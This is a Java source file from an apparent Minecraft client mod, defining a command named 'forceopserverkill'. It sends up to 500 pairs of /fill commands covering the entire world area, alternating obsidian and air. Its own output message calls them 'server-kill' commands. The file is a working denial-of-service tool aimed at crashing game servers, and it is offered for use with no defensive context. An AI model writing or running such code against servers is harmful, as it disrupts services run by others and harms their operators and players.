package dev.mlml.korppu.command.commands;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.command.Command;
import dev.mlml.korppu.command.coloring.ArgType;
import dev.mlml.korppu.command.coloring.PossibleArg;
import dev.mlml.korppu.command.exception.CommandException;
import dev.mlml.korppu.imgui.windows.ConsoleWindow;

public class ForceOPServerKill extends Command {
    public ForceOPServerKill() {
        super("forceopserverkill", "Sends repeated OP-grade fill payloads", "fopkill");
    }

    @Override
    public PossibleArg getSuggestionsWithType(int index, String[] args) {
        if (index == 0) return new PossibleArg(ArgType.NUMBER, "count");
        return super.getSuggestionsWithType(index, args);
    }

    @Override
    public void execute(String[] args) throws CommandException {
        if (KorppuMod.mc.player == null) throw new CommandException("Not in world.");

        int count = 20;
        if (args.length >= 1) {
            try {
                count = Math.max(1, Math.min(500, Integer.parseInt(args[0])));
            } catch (NumberFormatException e) {
                throw new CommandException("Invalid count: " + args[0]);
            }
        }

        for (int i = 0; i < count; i++) {
            KorppuMod.mc.player.connection.sendCommand("fill -30000000 0 -30000000 30000000 255 30000000 minecraft:obsidian");
            KorppuMod.mc.player.connection.sendCommand("fill -30000000 0 -30000000 30000000 255 30000000 minecraft:air");
        }

        ConsoleWindow.print("Sent " + (count * 2) + " force-op server-kill commands.");
    }
}
